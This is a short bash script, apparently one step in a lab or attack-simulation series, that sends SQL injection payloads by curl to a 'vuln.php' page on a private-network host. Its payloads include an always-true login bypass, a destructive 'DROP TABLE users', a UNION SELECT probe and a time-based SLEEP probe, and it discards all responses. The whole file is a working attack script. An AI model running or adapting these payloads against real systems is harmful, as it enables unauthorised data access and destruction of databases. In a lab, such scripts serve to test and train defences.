#!/bin/bash
# 04 - Web SQL Injection

TARGET_WEB_IP="192.168.64.7"
URL="http://$TARGET_WEB_IP/vuln.php"

PAYLOADS=(
  "' OR '1'='1"
  "'; DROP TABLE users; --"
  "' UNION SELECT NULL,NULL,NULL --"
  "SLEEP(10) --"
)

echo "[*] SQLi contre $URL ..."

for payload in "${PAYLOADS[@]}"; do
  echo "  -> payload: $payload"
  curl -s --get "$URL" --data-urlencode "q=$payload" >/dev/null 2>&1 || true
  sleep 1
done

echo "[+] SQL injection simulée"
